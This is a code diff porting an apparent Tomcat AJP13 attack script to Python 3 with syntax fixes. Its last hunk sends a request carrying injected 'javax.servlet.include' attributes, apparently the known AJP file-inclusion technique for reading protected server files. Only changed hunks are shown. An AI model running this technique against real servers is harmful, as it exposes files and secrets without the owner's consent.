@@ -25,7 +25,7 @@ class NotFoundException(Exception):
 	pass
 class AjpBodyRequest(object):
 	# server == web server, container == servlet
-	SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)
+	SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = list(range(2))
 	MAX_REQUEST_LENGTH = 8186
 	def __init__(self, data_stream, data_len, data_direction=None):
 		self.data_stream = data_stream
@@ -54,10 +54,10 @@ class AjpBodyRequest(object):
 			if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:
 				break
 class AjpForwardRequest(object):
-	_, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28)
+	_, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = list(range(28))
 	REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE}
 	# server == web server, container == servlet
-	SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)
+	SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = list(range(2))
 	COMMON_HEADERS = ["SC_REQ_ACCEPT",
 		"SC_REQ_ACCEPT_CHARSET", "SC_REQ_ACCEPT_ENCODING", "SC_REQ_ACCEPT_LANGUAGE", "SC_REQ_AUTHORIZATION",
 		"SC_REQ_CONNECTION", "SC_REQ_CONTENT_TYPE", "SC_REQ_CONTENT_LENGTH", "SC_REQ_COOKIE", "SC_REQ_COOKIE2",
@@ -172,7 +172,7 @@ class AjpForwardRequest(object):
 		return res
 
 class AjpResponse(object):
-	_,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)
+	_,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = list(range(7))
 	COMMON_SEND_HEADERS = [
 			"Content-Type", "Content-Language", "Content-Length", "Date", "Last-Modified",
 			"Location", "Set-Cookie", "Set-Cookie2", "Servlet-Engine", "Status", "WWW-Authenticate"
@@ -259,12 +259,12 @@ class Tomcat(object):
 		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		self.socket.connect((target_host, target_port))
-		self.stream = self.socket.makefile("rb", bufsize=0)
+		self.stream = self.socket.makefile("rb", buffering=0)
 
 	def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
 		self.req_uri = req_uri
 		self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
-		print("Getting resource at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
+		print(("Getting resource at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri)))
 		if user is not None and password is not None:
 			self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode('base64').replace('\n', '')
 		for h in headers:
@@ -277,7 +277,7 @@ class Tomcat(object):
 		snd_hdrs_res = responses[0]
 		data_res = responses[1:-1]
 		if len(data_res) == 0:
-			print("No data in response. Headers:%s\n" % snd_hdrs_res.response_headers)
+			print(("No data in response. Headers:%s\n" % snd_hdrs_res.response_headers))
 		return snd_hdrs_res, data_res
 
 '''
@@ -299,4 +299,4 @@ _,data = t.perform_request('/asdf',attributes=[
     {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},
     ])
 print('----------------------------')
-print("".join([d.data for d in data]))
+print(b"".join([d.data for d in data]).decode('utf-8', errors='ignore'))
